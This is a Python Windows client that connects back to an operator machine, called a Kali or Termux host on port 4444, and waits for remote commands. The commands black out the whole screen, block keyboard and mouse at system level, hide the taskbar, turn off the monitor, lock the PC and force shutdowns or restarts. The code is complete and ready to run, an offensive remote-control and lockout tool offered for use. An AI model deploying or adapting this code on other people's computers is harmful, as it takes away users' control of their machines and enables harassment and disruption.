#!/usr/bin/env python3
"""
Remote Control Client - Full Screen Black Edition
Complete screen blackout with keyboard/mouse block
"""

import socket
import subprocess
import os
import time
import threading
import sys
import ctypes
import platform
import tkinter as tk
from tkinter import ttk
import win32api
import win32con
import win32gui
from ctypes import wintypes, POINTER, c_int, c_uint, c_bool, c_long, byref

class FullScreenBlackout:
    """Full screen blackout with input blocking"""
    
    def __init__(self):
        # Windows API constants
        self.WM_SYSCOMMAND = 0x0112
        self.SC_MONITORPOWER = 0xF170
        self.HWND_BROADCAST = 0xFFFF
        self.WM_CLOSE = 0x0010
        self.WM_KEYDOWN = 0x0100
        self.WM_KEYUP = 0x0101
        self.WM_SYSKEYDOWN = 0x0104
        self.WM_SYSKEYUP = 0x0105
        self.WM_MOUSEMOVE = 0x0200
        self.WM_LBUTTONDOWN = 0x0201
        self.WM_LBUTTONUP = 0x0202
        self.WM_RBUTTONDOWN = 0x0204
        self.WM_RBUTTONUP = 0x0205
        
        self.black_window = None
        self.is_blackout = False
        self.input_blocked = False
        
        # Get screen dimensions
        self.screen_width = ctypes.windll.user32.GetSystemMetrics(0)
        self.screen_height = ctypes.windll.user32.GetSystemMetrics(1)
        
    def create_black_screen(self):
        """Create full screen black window"""
        try:
            # Create transparent window with black background
            self.black_window = tk.Tk()
            self.black_window.attributes('-fullscreen', True)
            self.black_window.attributes('-topmost', True)
            self.black_window.attributes('-alpha', 1.0)
            self.black_window.configure(bg='black')
            
            # Remove window decorations
            self.black_window.overrideredirect(True)
            
            # Disable close button
            self.black_window.protocol("WM_DELETE_WINDOW", lambda: None)
            
            # Block all input events
            self.black_window.bind('<Key>', self.block_event)
            self.black_window.bind('<Button>', self.block_event)
            self.black_window.bind('<Motion>', self.block_event)
            self.black_window.bind('<FocusIn>', self.block_event)
            self.black_window.bind('<FocusOut>', self.block_event)
            
            # Block Alt+F4
            self.black_window.bind('<Alt-F4>', self.block_event)
            
            # Add full screen black label
            label = tk.Label(
                self.black_window,
                text="🔴 SCREEN LOCKED",
                font=('Arial', 48, 'bold'),
                fg='red',
                bg='black'
            )
            label.place(relx=0.5, rely=0.5, anchor='center')
            
            # Add subtext
            subtext = tk.Label(
                self.black_window,
                text="Remote Control Active",
                font=('Arial', 20),
                fg='#444444',
                bg='black'
            )
            subtext.place(relx=0.5, rely=0.6, anchor='center')
            
            # Block input at system level
            self.block_system_input(True)
            
            # Hide taskbar
            self.hide_taskbar(True)
            
            self.is_blackout = True
            
            # Update window
            self.black_window.update()
            
            print("✅ Full screen blackout activated!")
            print("⚠️ Keyboard and mouse blocked!")
            
            return True
            
        except Exception as e:
            print(f"❌ Error creating black screen: {e}")
            return False
    
    def block_event(self, event):
        """Block all events"""
        return "break"
    
    def block_system_input(self, block):
        """Block/Unblock system input"""
        try:
            if block:
                # Block keyboard and mouse input
                ctypes.windll.user32.BlockInput(True)
                self.input_blocked = True
                print("🔒 Input blocked")
            else:
                ctypes.windll.user32.BlockInput(False)
                self.input_blocked = False
                print("🔓 Input unblocked")
        except Exception as e:
            print(f"⚠️ Input block error: {e}")
    
    def hide_taskbar(self, hide):
        """Hide/Show taskbar"""
        try:
            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
            if hide:
                win32gui.ShowWindow(taskbar, 0)  # Hide
                print("📌 Taskbar hidden")
            else:
                win32gui.ShowWindow(taskbar, 1)  # Show
                print("📌 Taskbar shown")
        except Exception as e:
            print(f"⚠️ Taskbar error: {e}")
    
    def remove_black_screen(self):
        """Remove black screen and restore input"""
        try:
            if self.black_window:
                self.black_window.destroy()
                self.black_window = None
            
            # Unblock input
            self.block_system_input(False)
            
            # Show taskbar
            self.hide_taskbar(False)
            
            self.is_blackout = False
            
            print("✅ Blackout removed!")
            print("🟢 Screen restored!")
            
            return True
            
        except Exception as e:
            print(f"❌ Error removing blackout: {e}")
            return False
    
    def toggle_blackout(self):
        """Toggle blackout on/off"""
        if self.is_blackout:
            return self.remove_black_screen()
        else:
            return self.create_black_screen()

class WindowsRemoteClient:
    """Main client with full control"""
    
    def __init__(self, server_ip='192.168.1.100', port=4444):
        self.server_ip = server_ip
        self.port = port
        self.running = True
        self.screen_on = True
        self.power_on = True
        self.system = platform.system()
        
        # Initialize blackout
        self.blackout = FullScreenBlackout()
        
        # Console handle
        self.console_handle = ctypes.windll.kernel32.GetConsoleWindow()
        
    def clear_screen(self):
        """Clear terminal"""
        os.system('cls')
    
    def display_banner(self):
        """Show banner"""
        banner = """
╔═══════════════════════════════════════════════╗
║    🎯 WINDOWS REMOTE CLIENT                  ║
║    🔴 FULL SCREEN BLACKOUT SUPPORT           ║
╚═══════════════════════════════════════════════╝
        """
        print(banner)
        print(f"🖥️  System: {self.system}")
        print(f"🔗 Server: {self.server_ip}:{self.port}")
        print(f"📱 Status: {'🟢 Connected' if self.running else '🔴 Disconnected'}")
        print("=" * 50)
    
    def connect(self):
        """Connect to server"""
        while self.running:
            try:
                self.clear_screen()
                self.display_banner()
                print("⏳ Connecting to server...")
                
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(5)
                self.sock.connect((self.server_ip, self.port))
                print(f"✅ Connected to {self.server_ip}:{self.port}")
                print("⏳ Waiting for commands...")
                self.handle_commands()
                
            except socket.timeout:
                print("⚠️ Connection timeout! Retrying...")
                time.sleep(3)
            except ConnectionRefusedError:
                print("❌ Connection refused! Retrying in 5 seconds...")
                time.sleep(5)
            except Exception as e:
                print(f"⚠️ Connection error: {e}")
                time.sleep(5)
    
    def handle_commands(self):
        """Handle incoming commands"""
        while self.running:
            try:
                data = self.sock.recv(1024).decode()
                if not data:
                    break
                
                print(f"\n📩 Command: {data}")
                self.execute_command(data)
                
                # Send acknowledgment
                self.sock.send(b'OK')
                
            except socket.timeout:
                continue
            except Exception as e:
                print(f"⚠️ Error: {e}")
                break
    
    def execute_command(self, command):
        """Execute received command"""
        if command == 'screen_off':
            self.screen_off_full()
        elif command == 'screen_on':
            self.screen_on_full()
        elif command == 'power_off':
            self.power_off()
        elif command == 'power_on':
            self.power_on()
        elif command == 'slow_anim':
            self.slow_animation()
        elif command == 'fast_anim':
            self.fast_animation()
        elif command == 'matrix_anim':
            self.matrix_effect()
        elif command == 'rainbow_anim':
            self.rainbow_effect()
        elif command == 'lock_pc':
            self.lock_pc()
        elif command == 'shutdown':
            self.shutdown_pc()
        elif command == 'restart':
            self.restart_pc()
        elif command == 'emergency_stop':
            self.emergency_stop()
        elif command == 'get_info':
            self.get_system_info()
        elif command == 'blackout_status':
            self.get_blackout_status()
        else:
            print(f"⚠️ Unknown command: {command}")
    
    def screen_off_full(self):
        """Full screen blackout"""
        print("⬛ Activating full screen blackout...")
        print("⚠️ Keyboard and mouse will be blocked!")
        
        # Start blackout in thread to keep connection alive
        def do_blackout():
            self.blackout.create_black_screen()
        
        thread = threading.Thread(target=do_blackout, daemon=True)
        thread.start()
        
        # Also turn off monitor
        try:
            ctypes.windll.user32.SendMessageW(
                self.blackout.HWND_BROADCAST,
                self.blackout.WM_SYSCOMMAND,
                self.blackout.SC_MONITORPOWER,
                2
            )
        except:
            pass
        
        print("✅ Screen locked and blacked out!")
    
    def screen_on_full(self):
        """Remove blackout and restore screen"""
        print("⬜ Restoring screen...")
        
        # Remove blackout
        self.blackout.remove_black_screen()
        
        # Turn on monitor
        try:
            ctypes.windll.user32.SetCursorPos(100, 100)
            time.sleep(0.1)
            ctypes.windll.user32.SetCursorPos(200, 200)
            ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
        except:
            pass
        
        # Force refresh
        try:
            ctypes.windll.user32.InvalidateRect(0, 0, True)
        except:
            pass
        
        print("✅ Screen restored!")
        print("🟢 Keyboard and mouse enabled!")
    
    def power_off(self):
        """Turn off monitor"""
        print("🔴 Turning off monitor...")
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            print("✅ Monitor off")
        except Exception as e:
            print(f"⚠️ Error: {e}")
    
    def power_on(self):
        """Turn on monitor"""
        print("🟢 Turning on monitor...")
        try:
            ctypes.windll.user32.SetCursorPos(100, 100)
            time.sleep(0.1)
            ctypes.windll.user32.SetCursorPos(200, 200)
            ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
            print("✅ Monitor on")
        except Exception as e:
            print(f"⚠️ Error: {e}")
    
    def slow_animation(self):
        """Slow animation"""
        print("🌀 Starting slow animation...")
        try:
            for i in range(10):
                self.clear_screen()
                progress = "█" * i + "▒" * (10 - i)
                print(f"[{progress}] {i*10}%")
                print("🌀 ANIMATION IN PROGRESS")
                print("=" * 30)
                print(f"🔄 Frame: {i+1}/10")
                time.sleep(0.5)
            self.clear_screen()
            print("✅ Animation complete!")
        except Exception as e:
            print(f"⚠️ Error: {e}")
    
    def fast_animation(self):
        """Fast flashing"""
        print("⚡ Fast animation started!")
        try:
            for _ in range(20):
                self.clear_screen()
                print("█" * 50)
                print("⚡ FLASHING ⚡")
                time.sleep(0.05)
                self.clear_screen()
                print(" " * 50)
                print("⚡ FLASHING ⚡")
                time.sleep(0.05)
            self.clear_screen()
            print("✅ Fast animation complete!")
        except:
            pass
    
    def matrix_effect(self):
        """Matrix effect"""
        print("💀 Matrix Effect!")
        chars = "01"
        try:
            for i in range(30):
                self.clear_screen()
                print("\033[92m" + "=" * 50 + "\033[0m")
                for j in range(5):
                    line = ''.join(chars[(i + j) % 2] for _ in range(50))
                    print(f"\033[92m{line}\033[0m")
                print("\033[92m" + "=" * 50 + "\033[0m")
                time.sleep(0.05)
            self.clear_screen()
        except:
            pass
    
    def rainbow_effect(self):
        """Rainbow effect"""
        print("🎨 Rainbow Effect!")
        colors = ['\033[91m', '\033[93m', '\033[92m', '\033[96m', '\033[94m', '\033[95m']
        for i in range(30):
            color = colors[i % len(colors)]
            print(f"{color}🌈 RAINBOW {i+1}/30\033[0m")
            time.sleep(0.1)
    
    def lock_pc(self):
        """Lock Windows"""
        print("🔒 Locking PC...")
        try:
            ctypes.windll.user32.LockWorkStation()
            print("✅ PC Locked")
        except:
            print("❌ Failed to lock PC")
    
    def shutdown_pc(self):
        """Shutdown PC"""
        print("🔄 Shutting down PC in 10 seconds...")
        try:
            subprocess.run(['shutdown', '/s', '/t', '10', '/c', 'Remote shutdown'])
            print("✅ Shutdown initiated")
        except:
            print("❌ Failed to shutdown")
    
    def restart_pc(self):
        """Restart PC"""
        print("🔄 Restarting PC in 10 seconds...")
        try:
            subprocess.run(['shutdown', '/r', '/t', '10', '/c', 'Remote restart'])
            print("✅ Restart initiated")
        except:
            print("❌ Failed to restart")
    
    def get_system_info(self):
        """Get system info"""
        print("📊 System Information:")
        print("=" * 40)
        print(f"💻 Computer: {platform.node()}")
        print(f"🖥️  System: {platform.system()} {platform.release()}")
        print(f"🔧 Architecture: {platform.machine()}")
        print(f"📱 Screen: {self.blackout.screen_width}x{self.blackout.screen_height}")
        print(f"🔒 Blackout: {'Active' if self.blackout.is_blackout else 'Inactive'}")
        print("=" * 40)
    
    def get_blackout_status(self):
        """Get blackout status"""
        status = "🔴 ACTIVE" if self.blackout.is_blackout else "🟢 INACTIVE"
        print(f"📱 Blackout Status: {status}")
    
    def emergency_stop(self):
        """Emergency stop"""
        print("\n🆘 EMERGENCY STOP!")
        print("⚠️ Restoring everything...")
        
        # Remove blackout
        if self.blackout.is_blackout:
            self.blackout.remove_black_screen()
        
        # Show taskbar
        self.blackout.hide_taskbar(False)
        
        # Unblock input
        self.blackout.block_system_input(False)
        
        print("✅ System restored!")
        self.running = False
        sys.exit(0)

if __name__ == "__main__":
    print("=" * 50)
    print("🎯 Windows Remote Client - Full Blackout")
    print("=" * 50)
    
    # Get server IP
    if len(sys.argv) > 1:
        server_ip = sys.argv[1]
    else:
        server_ip = input("📡 Enter Termux/Kali IP: ").strip()
        if not server_ip:
            server_ip = "192.168.1.100"
    
    # Get port
    port_input = input("📡 Enter port (default 4444): ").strip()
    port = int(port_input) if port_input else 4444
    
    print(f"\n🔗 Connecting to {server_ip}:{port}")
    print("Press Ctrl+C to exit\n")
    
    client = WindowsRemoteClient(server_ip, port)
    
    try:
        client.connect()
    except KeyboardInterrupt:
        print("\n👋 Disconnected")
        if client.blackout.is_blackout:
            client.blackout.remove_black_screen()
    except Exception as e:
        print(f"❌ Error: {e}")
